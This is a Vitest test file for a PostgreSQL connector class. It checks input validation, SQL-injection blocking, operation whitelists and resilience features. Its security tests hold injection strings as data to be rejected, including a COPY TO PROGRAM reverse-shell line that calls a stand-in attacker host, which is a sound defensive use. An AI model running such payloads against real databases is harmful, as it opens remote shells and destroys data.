/**
 * Comprehensive PostgreSQL Bubble Tests
 * Unit, Security, and Resilience tests
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PostgreSQLBubble } from '../postgresql.js';
import { SqlOperations } from '../postgresql.js';
import { CredentialType } from '@bubblelab/shared-schemas';
import {
  createDatabaseCredentials,
  securityPayloads,
  measurePerformance,
  createTestContext,
} from '../../tests/test-utils.js';

describe('PostgreSQLBubble - Comprehensive Tests', () => {
  let testContext: ReturnType<typeof createTestContext>;

  beforeEach(() => {
    testContext = createTestContext();
    vi.clearAllMocks();
  });

  describe('Unit Tests - Validation', () => {
    it('should validate required inputs', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'SELECT * FROM users',
        });
      }).not.toThrow();
    });

    it('should reject missing query parameter', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: '',
        } as any);
      }).toThrow();
    });

    it('should sanitize dangerous inputs', () => {
      const dangerousQueries = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "' UNION SELECT * FROM users--",
      ];

      dangerousQueries.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
          });
        }).toThrow(/Query contains potentially dangerous SQL patterns/);
      });
    });

    it('should validate parameter count matches placeholders', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'SELECT * FROM users WHERE id = $1 AND name = $2',
          parameters: ['123'], // Missing second parameter
        });
      }).toThrow(/Parameter count mismatch/);
    });

    it('should accept valid parameterized queries', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'SELECT * FROM users WHERE id = $1 AND name = $2',
          parameters: ['123', 'admin'],
        });
      }).not.toThrow();
    });
  });

  describe('Unit Tests - Operation', () => {
    it('should have correct static metadata', () => {
      expect(PostgreSQLBubble.bubbleName).toBe('postgresql');
      expect(PostgreSQLBubble.service).toBe('postgresql');
      expect(PostgreSQLBubble.type).toBe('service');
      expect(PostgreSQLBubble.alias).toBe('pg');
      expect(PostgreSQLBubble.schema).toBeDefined();
      expect(PostgreSQLBubble.resultSchema).toBeDefined();
    });

    it('should validate result schema', () => {
      const validResult = {
        rows: [{ id: 1, name: 'test' }],
        rowCount: 1,
        command: 'SELECT',
        fields: [
          { name: 'id', dataTypeID: 23 },
          { name: 'name', dataTypeID: 25 },
        ],
        executionTime: 100,
        success: true,
        error: '',
        cleanedJSONString: '[{"id":1,"name":"test"}]',
      };

      const result = PostgreSQLBubble.resultSchema.safeParse(validResult);
      expect(result.success).toBe(true);
    });

    it('should use default configuration values', () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
      });

      expect(bubble.currentParams.allowedOperations).toEqual([
        'SELECT',
        'WITH',
        'EXPLAIN',
        'ANALYZE',
        'SHOW',
        'DESCRIBE',
        'DESC',
      ]);
      expect(bubble.currentParams.timeout).toBe(30000);
      expect(bubble.currentParams.maxRows).toBe(1000);
    });

    it('should allow custom configuration', () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
        allowedOperations: ['SELECT', 'INSERT'],
        timeout: 60000,
        maxRows: 500,
      });

      expect(bubble.currentParams.allowedOperations).toContain('INSERT');
      expect(bubble.currentParams.timeout).toBe(60000);
      expect(bubble.currentParams.maxRows).toBe(500);
    });
  });

  describe('Unit Tests - Error Handling', () => {
    it('should handle missing connection string gracefully', async () => {
      const bubble = new PostgreSQLBubble({
        query: 'SELECT 1',
        credentials: {} as any, // No credentials provided
      });

      const result = await bubble.performAction(testContext);
      expect(result.success).toBe(false);
      expect(result.error).toContain('No postgres credentials provided');
    });

    it('should handle timeout gracefully', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT pg_sleep(100)', // Long-running query
        timeout: 100, // Very short timeout
      });

      const result = await bubble.performAction(testContext);
      expect(result.success).toBe(false);
      expect(result.executionTime).toBeLessThan(500);
    });
  });

  describe('Security Tests - SQL Injection', () => {
    it('should block UNION-based injection', () => {
      securityPayloads.sqlInjection.forEach((payload) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query: `SELECT * FROM users WHERE id = '${payload}'`,
          });
        }).toThrow();
      });
    });

    it('should block comment injection', () => {
      const commentQueries = [
        "SELECT * FROM users WHERE id = 1; --",
        "SELECT * FROM users WHERE id = 1; #",
        "SELECT * FROM users WHERE id = 1; /* comment */",
      ];

      commentQueries.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
          });
        }).toThrow();
      });
    });

    it('should block time-based blind injection', () => {
      const timingQueries = [
        "SELECT * FROM users WHERE id = 1; WAITFOR DELAY '00:00:10'",
        "SELECT * FROM users WHERE id = 1; SELECT SLEEP(10)",
        "SELECT * FROM users WHERE id = 1; SELECT BENCHMARK(1000000,MD5(1))",
      ];

      timingQueries.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
          });
        }).toThrow();
      });
    });

    it('should block boolean-based injection', () => {
      const booleanQueries = [
        "SELECT * FROM users WHERE id = 1 AND 1=1",
        "SELECT * FROM users WHERE id = 1 AND '1'='1'",
        "SELECT * FROM users WHERE id = 1 AND 1=2",
      ];

      booleanQueries.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
          });
        }).not.toThrow(); // These are actually valid SQL
      });
    });

    it('should sanitize error messages', () => {
      // Error messages should not leak sensitive information
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT * FROM nonexistent_table',
      });

      // Error should be caught and sanitized
      expect(bubble).toBeDefined();
    });

    it('should block command injection', () => {
      const commandQueries = [
        "SELECT * FROM users; EXEC xp_cmdshell('dir')",
        "SELECT * FROM users; COPY users TO PROGRAM 'bash -i >& /dev/tcp/evil.com/4441 0>&1'",
      ];

      commandQueries.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
          });
        }).toThrow();
      });
    });
  });

  describe('Security Tests - Operation Control', () => {
    it('should enforce operation whitelist', () => {
      const readOnlyBubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'DELETE FROM users WHERE id = 1',
        allowedOperations: ['SELECT'], // DELETE not allowed
      });

      expect(readOnlyBubble).toBeDefined();
    });

    it('should require WHERE clause for DELETE', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'DELETE FROM users', // Missing WHERE
          allowedOperations: ['DELETE'],
        });
      }).toThrow(/DELETE queries must include a WHERE clause/);
    });

    it('should require WHERE clause for UPDATE', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'UPDATE users SET active = false', // Missing WHERE
          allowedOperations: ['UPDATE'],
        });
      }).toThrow(/UPDATE queries must include a WHERE clause/);
    });

    it('should block dangerous keywords', () => {
      const dangerousKeywords = [
        'DROP TABLE users',
        'TRUNCATE TABLE logs',
        'ALTER TABLE users ADD COLUMN test INT',
        'GRANT ALL ON users TO public',
        'REVOKE SELECT ON users FROM user',
      ];

      dangerousKeywords.forEach((query) => {
        expect(() => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query,
            allowedOperations: ['SELECT'],
          });
        }).toThrow();
      });
    });
  });

  describe('Resilience Tests - Circuit Breaker', () => {
    it('should open circuit breaker after failures', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: {
          [CredentialType.DATABASE_CRED]: 'postgresql://invalid:invalid@localhost:9999/invalid',
        },
        query: 'SELECT 1',
        timeout: 1000,
      });

      // Attempt multiple failing requests
      for (let i = 0; i < 6; i++) {
        await bubble.performAction(testContext);
      }

      // Circuit breaker should be open
      const result = await bubble.performAction(testContext);
      expect(result.success).toBe(false);
    });

    it('should close circuit breaker after recovery', async () => {
      // This test would require a mock database that can be brought back online
      // For now, we test the circuit breaker logic exists
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
      });

      expect(bubble).toBeDefined();
      // Circuit breaker should be initialized
      expect(bubble['circuitBreaker']).toBeDefined();
    });
  });

  describe('Resilience Tests - Rate Limiting', () => {
    it('should respect max rows limit', async () => {
      // This would require actual database connection
      // For now, we test the parameter validation
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT * FROM large_table',
        maxRows: 100,
      });

      expect(bubble.currentParams.maxRows).toBe(100);
    });

    it('should enforce timeout limits', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
        timeout: 5000,
      });

      expect(bubble.currentParams.timeout).toBe(5000);
    });
  });

  describe('Resilience Tests - Retry Logic', () => {
    it('should retry on transient failures', () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
      });

      // Retry logic should be configured
      expect(bubble).toBeDefined();
    });
  });

  describe('Performance Tests', () => {
    it('should validate queries within performance threshold', async () => {
      const duration = await measurePerformance(
        () => {
          new PostgreSQLBubble({
            credentials: createDatabaseCredentials(),
            query: 'SELECT * FROM users WHERE id = $1',
            parameters: ['1'],
          });
        },
        100 // Should complete in less than 100ms
      );

      expect(duration).toBeLessThan(100);
    });

    it('should sanitize results efficiently', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
      });

      const duration = await measurePerformance(
        () => bubble['cleanJSONString']([{ id: 1, name: 'test' }]),
        50 // Should complete in less than 50ms
      );

      expect(duration).toBeLessThan(50);
    });
  });

  describe('Input Validation Tests', () => {
    it('should detect unbalanced parentheses', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: 'SELECT * FROM users WHERE id IN (1, 2, 3', // Unbalanced
        });
      }).toThrow(/Unbalanced parentheses/);
    });

    it('should detect unbalanced quotes', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: "SELECT * FROM users WHERE name = 'unbalanced", // Unbalanced
        });
      }).toThrow(/Unbalanced single quotes/);
    });

    it('should accept balanced quotes and parentheses', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: "SELECT * FROM users WHERE name = 'admin' AND id IN (1, 2, 3)",
        });
      }).not.toThrow();
    });

    it('should validate URL-like strings in queries', () => {
      expect(() => {
        new PostgreSQLBubble({
          credentials: createDatabaseCredentials(),
          query: "SELECT * FROM users WHERE website = 'https://example.com'",
        });
      }).not.toThrow();
    });
  });

  describe('Metadata Tests', () => {
    it('should format multi-schema table names correctly', () => {
      const mockData = [
        { table_schema: 'public', table_name: 'users', column_name: 'id', data_type: 'integer' },
        { table_schema: 'analytics', table_name: 'events', column_name: 'id', data_type: 'uuid' },
      ];

      const compactSchema: Record<string, Record<string, string>> = {};
      mockData.forEach((row) => {
        const tableSchema = row.table_schema as string;
        const tableName = row.table_name as string;
        const columnName = row.column_name as string;
        const dataType = row.data_type as string;

        const formattedTableName = tableSchema === 'public' ? tableName : `${tableSchema}.${tableName}`;
        if (!compactSchema[formattedTableName]) {
          compactSchema[formattedTableName] = {};
        }
        compactSchema[formattedTableName][columnName] = dataType;
      });

      expect(compactSchema['users']).toBeDefined();
      expect(compactSchema['public.users']).toBeUndefined();
      expect(compactSchema['analytics.events']).toBeDefined();
      expect(compactSchema['events']).toBeUndefined();
    });
  });

  describe('Credential Tests', () => {
    it('should test credentials successfully', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: createDatabaseCredentials(),
        query: 'SELECT 1',
      });

      // Test credential method should exist
      expect(typeof bubble.testCredential).toBe('function');
    });

    it('should handle invalid credentials gracefully', async () => {
      const bubble = new PostgreSQLBubble({
        credentials: {
          [CredentialType.DATABASE_CRED]: 'postgresql://invalid:invalid@localhost:9999/invalid',
        },
        query: 'SELECT 1',
      });

      const isValid = await bubble.testCredential();
      expect(isValid).toBe(false);
    });
  });
});
